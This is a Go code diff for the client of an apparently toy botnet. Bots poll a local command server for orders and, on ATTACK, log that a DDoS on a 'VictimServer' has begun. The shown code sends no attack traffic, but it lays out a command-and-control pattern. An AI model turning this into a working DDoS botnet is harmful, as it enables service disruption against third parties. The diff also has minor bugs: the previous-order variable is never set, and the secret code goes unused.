@@ -25,16 +25,16 @@ type JsonClient struct {
 
 type Client struct {
 	Name             string
-	HttpClientDriver http.Client
+	HttpClientDriver *http.Client
 	TargetServer     string
 	VictimServer     string
 }
 
 func NewDefaultClient() *Client {
-	return NewClient("default", http.Client{}, "http://localhost:8080")
+	return NewClient("default", &http.Client{}, "http://localhost:8080")
 }
 
-func NewClient(name string, clientDriver http.Client, targetServer string) *Client {
+func NewClient(name string, clientDriver *http.Client, targetServer string) *Client {
 	once.Do(func() {
 		instance = &Client{
 			Name:             name,
@@ -47,14 +47,14 @@ func NewClient(name string, clientDriver http.Client, targetServer string) *Clie
 
 func GetClient() *Client {
 	if instance == nil {
-		c := NewClient("default", http.Client{}, "http://localhost:8080")
+		c := NewClient("default", &http.Client{}, "http://localhost:8080")
 		return c
 	}
 	return instance
 }
 
-func (c *Client) Get(url string) (interface{}, error) {
-	resp, err := c.HttpClientDriver.Get(c.TargetServer + url)
+func (c *Client) Get(url string, params string) (interface{}, error) {
+	resp, err := c.HttpClientDriver.Get(c.TargetServer + url + params)
 	if err != nil {
 		return nil, err
 	}
@@ -102,36 +102,44 @@ func (c *Client) JoinCamp() (interface{}, error) {
 }
 
 func (c *Client) GetCampInfo() (interface{}, error) {
-	return c.Get("/camp")
+	return c.Get("/camp", "")
 }
 
 func (c *Client) Ping() (interface{}, error) {
-	return c.Get("/ping")
+	return c.Get("/ping", "")
 }
 
 func (c *Client) ReceiveOrder() (interface{}, error) {
-	return c.Get("/order")
+	return c.Get("/order", "?name="+c.Name)
 }
 
 func (c *Client) ListenToOrders() {
+	var pervOder string
 	for {
 		order, err := c.ReceiveOrder()
 		if err != nil {
 			panic(err)
 		}
+		if pervOder == order {
+			continue
+		}
 		if order == ATTACK {
-			log.Printf("DDOS attack on %s", c.VictimServer)
+			log.Printf("ATTACKING! DDOS attack on %s", c.VictimServer)
 		}
 		if order == STOP {
 			log.Printf("DDOS attack on %s stopped", c.TargetServer)
 		}
 		if order == NOTHING {
-			log.Printf("No order received")
+
 		}
-		time.Sleep(3 * time.Second)
+		time.Sleep(2 * time.Second)
 	}
 }
 
 func (c *Client) LeaveCamp() (interface{}, error) {
-	return c.Get("/leave")
+	return c.Get("/leave", "")
+}
+
+func (c *Client) MakeOrder(order string, secretCode string) (interface{}, error) {
+	return c.Post("/order", order)
 }
